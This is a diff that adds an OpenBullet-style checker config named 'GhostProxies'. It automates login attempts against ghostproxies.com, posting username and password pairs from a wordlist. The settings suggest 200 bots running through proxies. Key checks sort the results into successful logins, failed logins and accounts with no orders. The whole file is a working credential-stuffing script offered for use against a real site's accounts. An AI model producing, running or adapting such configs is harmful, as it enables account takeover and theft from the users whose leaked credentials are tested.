@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "GhostProxies",
+  "SuggestedBots": 200,
+  "LastModified": "2019-04-07T16:18:08.977407+07:00",
+  "AdditionalInfo": "",
+  "Author": "Onyx:Garfield#7189",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_LOGIN REQUEST POST "https://ghostproxies.com/login" AutoRedirect=FALSE 
+  CONTENT "_method=POST&data[User][email]=<USER>&data[User][password]=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://ghostproxies.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://ghostproxies.com/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+#SUCCESS_OF_NOT KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "GhostProxies - Login" 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS(*)>" Contains "https://ghostproxies.com/orders" 
+#REQUEST_INFO REQUEST GET "https://ghostproxies.com/orders" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://ghostproxies.com/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+#FREE_OF_NOT KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "There are no orders in your account" 
